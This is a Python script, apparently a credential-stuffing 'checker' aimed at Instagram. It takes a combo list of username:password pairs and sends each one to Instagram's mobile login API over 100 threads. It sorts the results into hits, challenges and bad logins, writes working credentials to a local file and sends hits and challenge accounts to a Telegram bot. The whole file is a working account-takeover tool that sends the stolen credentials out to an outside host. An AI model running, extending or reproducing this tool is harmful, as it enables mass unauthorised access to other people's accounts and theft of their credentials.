import requests
import os
from concurrent.futures import ThreadPoolExecutor
from uuid import uuid4
from colorama import init, Fore, Style
import time
import sys
from cfonts import render, say

init(autoreset=True)

am = render('İnsta', colors=['green', 'white'], align='center')
print(am)

init()

meme = "Developer: @BestEizon × Channel: @EizonxTool "

for harf in meme:
    print(Fore.CYAN + harf, end="", flush=True)
    time.sleep(0.1)

print(Style.RESET_ALL)



tok = input("[=] Enter Token: ")
id = input("[=] Enter id: ")


eizonhits = 0  
eizonchallenge = 0  
eizonbad = 0  
eizonretry = 0  
uid = str(uuid4())




def telegram(msg):
    try:
        url = f"https://api.telegram.org/bot{tok}/sendMessage"
        payload = {"chat_id": id, "text": msg}
        requests.post(url, data=payload)
    except:
        pass


def print_stats():
    print(f"{Fore.GREEN}Hits{Fore.WHITE}: {eizonhits} // {Fore.RED}Bad{Fore.WHITE}: {eizonbad} // {Fore.YELLOW}Retries{Fore.WHITE}: {eizonretry} // {Fore.CYAN}Challenge{Fore.WHITE}: {eizonchallenge} // @BestEizon")




def check(username, pasw):
    global eizonhits, eizonchallenge, eizonbad, eizonretry
    url = 'https://b.i.instagram.com/api/v1/accounts/login/'
    headers = {
        'User-Agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)'
    }
    data = {
        'uuid': uid,
        'password': pasw,
        'username': username,
        'device_id': uid,
        'from_reg': 'false',
        '_csrftoken': 'missing',
        'login_attempt_countn': '0'
    }

    try:
        response = requests.post(url, headers=headers, data=data)
        result = response.text

        
        if '"ip"' in result or 'ip_block' in result:
            
                        return  
        os.system('cls' if os.name == 'nt' else 'clear')
        print(f"{Fore.WHITE}json: {result}\n")

        if '"logged_in_user"' in result:
            eizonhits += 1
            print(f'{Fore.GREEN}[HIT] {username}:{pasw}')
            telegram("""[=] HIT
username: {username}
password: {pasw}
developer: @BestEizon""")
            with open('hits.txt', 'a') as f:
                f.write(f'{username}:{pasw}\n{result}\n')
        elif '"challenge_required"' in result:
            eizonchallenge += 1
            print(f'{Fore.YELLOW}[CHALLENGE] {username}:{pasw}')
            telegram(f"""⚠️ Doğrulama gerekli.
username: {username}
password: {pasw}
developer: @BestEizon""")
        else:
            eizonbad += 1
            print(f'{Fore.RED}[BAD] {username}:{pasw}')

        print_stats()
    except:
        eizonretry += 1
        print(f'{Fore.RED}[ERROR] Request Failed')
        print_stats()



secim = ('1')

try:
    dosya_adi = input('[=] Enter Combo: ')
    with open(dosya_adi, 'r', encoding='utf-8') as file:
        combo_list = file.read().splitlines()
except FileNotFoundError:
    print('[!] file not found.')
    sys.exit(1)


executor = ThreadPoolExecutor(max_workers=100)

for line in combo_list:
    if ':' in line:
        username, pasw = line.strip().split(':', 1)
        executor.submit(check, username, pasw)
        
        
 # By • @BestEizon \ Channel: @EizonxTool
